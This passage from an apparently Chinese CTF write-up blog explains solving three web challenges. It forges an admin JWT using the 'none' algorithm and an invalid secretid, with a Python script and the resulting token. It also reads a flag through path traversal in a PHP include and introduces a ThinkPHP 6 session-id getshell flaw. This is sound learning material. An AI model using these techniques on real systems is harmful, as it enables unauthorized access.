<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br><br><span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分先去寻找<code>token</code>所在的位置，然后从<code>token</code>中解析出<code>sid</code>并打印出来。注意最后的<code>if</code>判断语句：如果<code>sid</code>未定义&#x2F;为空&#x2F;(<code>0&lt;=sid&lt;=global.secrets.length</code>为假)那么就会抛出一个异常</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">        <span class="hljs-keyword">const</span> status = username === user.<span class="hljs-property">username</span> &amp;&amp; password === user.<span class="hljs-property">password</span>;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        &#125;<br><br><br><span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br></code></pre></td></tr></table></figure><p>会话对象中<code>username</code>需要是<code>admin</code>，前面做了<code>JWT</code>所以猜测要修改<code>JWT</code>的对应字段达到目的，最终读取<code>FLAG</code></p><p>有关<code>JWT</code>的内容可以参考这位师傅的文章：<code>[JSON Web Token（JWT）原理及用法 | 信安小蚂蚁 (gitee.io)](https://mayi077.gitee.io/2020/05/19/JSON-Web-Token（JWT）原理及用法/)</code></p><p>现在解题思路就清晰了：注册 –&gt; 修改<code>JWT</code>使其验证的<code>username</code>为<code>admin</code> –&gt; 登录</p><p>先注册一个<code>test</code>用户看看这个<code>JWT</code>：</p><p><img src="/img/hfctf2020ezlogin4.png" alt="hfctf2020ezlogin4"></p><p>放这个网站解密：<code>[JSON Web Tokens - jwt.io](https://jwt.io/)</code></p><p><img src="/img/hfctf2020ezlogin5.png" alt="hfctf2020ezlogin5"></p><p>首先我们要修改<code>username</code>字段为<code>admin</code>。然后注意：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br><br><span class="hljs-keyword">const</span> user = jwt.<span class="hljs-title function_">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><p>从 <code>global.secrets</code> 数组中获取指定索引 <code>sid</code> 处的元素，然后将其赋值给 <code>secret</code> 变量。<code>jwt.verify()</code> 方法接受三个参数：要验证的 <code>token</code>、密钥 <code>secret</code> 和一个包含选项的对象。在这里，选择了 <code>algorithm: &#39;HS256&#39;</code>，表示使用<code> HMAC-SHA256</code> 算法进行验证。</p><p>所以不能只考虑更换<code>username</code>字段值，就算改了签名那里过不了验证也是白搭。</p><p>首先是对于加密方式的利用：</p><p><img src="/img/hfctf2020ezlogin6.png" alt="hfctf2020ezlogin6"></p><p>但只改成<code>none</code>没啥用(验证时还是指定了算法为<code>HS256</code>)</p><blockquote><p>用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。</p></blockquote><p>具体原理可以参考赵师傅的博客：<code>[虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in)](https://www.zhaoj.in/read-6512.html)</code>，师傅讲的非常详细我就不写了，贴张比较重要的图：</p><p><img src="/img/hfctf2020ezlogin7.png" alt="hfctf2020ezlogin7"></p><p>现在我们需要把<code>secret</code>密钥置空，看下这东西怎么来的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br></code></pre></td></tr></table></figure><p>从 <code>global.secrets</code> 数组中获取索引为 <code>sid</code> 的元素</p><p><code>sid</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br></code></pre></td></tr></table></figure><p>通过修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。当然这东西也不能乱改：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/hfctf2020ezlogin8.png" alt="hfctf2020ezlogin8"></p><p>同样参考了赵师傅的博客，可以看到令<code>sid</code>为一个空数组时，<code>a[sid]</code>为<code>undefined</code>。</p><blockquote><p>JavaScript 是一门弱类型语言，空数组与数字比较永远为真</p></blockquote><p>当然这里用<code>&quot;0e啥的&quot;</code>绕过也可以(不同类型进行比较时也会有类型转换)</p><p>生成<code>token</code>(当然这里也能自己手动改):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> jwt<br><br>info = &#123;<span class="hljs-string">&#x27;iat&#x27;</span>: <span class="hljs-built_in">int</span>(time.time()),<br>    <span class="hljs-string">&quot;secretid&quot;</span>: <span class="hljs-string">&quot;0e123&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;<br><br>token = jwt.encode(info,key=<span class="hljs-string">&quot;&quot;</span>,algorithm=<span class="hljs-string">&quot;none&quot;</span>)<br><br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpYXQiOjE3MDI4MDE4NTgsInNlY3JldGlkIjoiMGUxMjMiLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.</code></p><p><img src="/img/hfctf2020ezlogin9.png" alt="hfctf2020ezlogin9"></p><p>登录<code>GetFlag</code></p><p><img src="/img/hfctf2020ezlogin10.png" alt="hfctf2020ezlogin10"></p><h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p><img src="/img/AliceWebsite1.png" alt="AliceWebsite1"></p><p>注意<code>URL</code>:<code>/index.php?action=home.php</code></p><p>给了个压缩包：</p><p><img src="/img/AliceWebsite2.png" alt="AliceWebsite2"></p><p><code>DSSTORE</code>文件里没啥东西:</p><p><img src="/img/AliceWebsite3.png" alt="AliceWebsite3"></p><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$action</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] : <span class="hljs-string">&#x27;home.php&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$action</span>)) &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$action</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有任何过滤的任意文件包含，注意这里会先进行<code>file_exists</code>，所以伪协议不要想了。</p><p><code>etc/passwd</code>能读：</p><p><img src="/img/AliceWebsite5.png" alt="AliceWebsite5"></p><p>目录穿越读flag:<code>/index.php?action=../../../flag</code></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p><code>www.zip</code>:里面有个<code>README.md</code></p><p><img src="/img/gyctf2020EasyThinking1.png" alt="gyctf2020EasyThinking1"></p><p>搜了下<code>thinkphp6</code>有什么洞：</p><p><code>[Thinkphp &lt; 6.0.2 session id未作过滤导致getshell - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7109)</code></p><p>主要就是由于程序未对session id进行危险字符判断，只要将session id写为类似于<code>xxxx.php</code>的格式，即可导致session保存成<code>.php</code>文件，从而getshell。</p><p><code>app/home/controler</code>下存在<code>member.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">home</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">exception</span>\<span class="hljs-title">ValidateException</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Db</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">View</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">common</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">common</span>\<span class="hljs-title">controller</span>\<span class="hljs-title">Auth</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Member</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;?UID&quot;</span>)) <span class="hljs-comment">//</span><br>        &#123;<br>            <span class="hljs-variable">$data</span> = [<span class="hljs-string">&quot;uid&quot;</span> =&gt; <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>)];<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$record</span>);<br>            <span class="hljs-variable">$username</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$data</span>)-&gt;<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-string">&quot;username&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;member/index&#x27;</span>,[<span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-variable">$username</span>,<span class="hljs-string">&quot;record_list&quot;</span> =&gt; <span class="hljs-variable">$recordArr</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;member/index&#x27;</span>,[<span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;Are you Login?&quot;</span>,<span class="hljs-string">&quot;record_list&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;username&quot;</span>);<br>            <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;password&quot;</span>));<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;username&quot;</span>] = <span class="hljs-variable">$username</span>;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;password&quot;</span>] = <span class="hljs-variable">$password</span>;<br>            <span class="hljs-variable">$userId</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$data</span>)-&gt;<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-string">&quot;uid&quot;</span>);<br>            <span class="hljs-variable">$userStatus</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$data</span>)-&gt;<span class="hljs-title function_ invoke__">value</span>(<span class="hljs-string">&quot;status&quot;</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userStatus</span> == <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;该用户已被禁用，无法登陆\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userId</span>)&#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>,<span class="hljs-variable">$userId</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&quot;/home/member/index&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;用户名或密码错误\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Auth</span>)-&gt;<span class="hljs-title function_ invoke__">validRegister</span>(<span class="hljs-variable">$data</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;当前用户名已注册\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br>            &#125;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;password&quot;</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;status&quot;</span>] = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(\&quot;注册失败\&quot;);history.go(-1)&lt;/script&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;register&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>,<span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;location.href=&#x27;/home/member/login&#x27;&lt;/script&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>        <span class="hljs-variable">$update</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&quot;uid&quot;</span>,<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>))-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$update</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;修改成功&quot;</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;修改失败&quot;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rePassword</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$oldPassword</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;oldPassword&quot;</span>);<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;password&quot;</span>);<br>        <span class="hljs-variable">$where</span>[<span class="hljs-string">&quot;uid&quot;</span>] = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>);<br>        <span class="hljs-variable">$where</span>[<span class="hljs-string">&quot;password&quot;</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$oldPassword</span>);<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$where</span>)-&gt;<span class="hljs-title function_ invoke__">find</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-variable">$rePassword</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">update</span>([<span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)],[<span class="hljs-string">&quot;uid&quot;</span>=&gt; <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>)]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$rePassword</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;修改成功&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;修改失败&quot;</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;原密码错误&quot;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>            &#125;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>            &#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$record</span>);<br>                <span class="hljs-variable">$recordLen</span> = <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$recordArr</span>);<br>                <span class="hljs-keyword">if</span> (<span 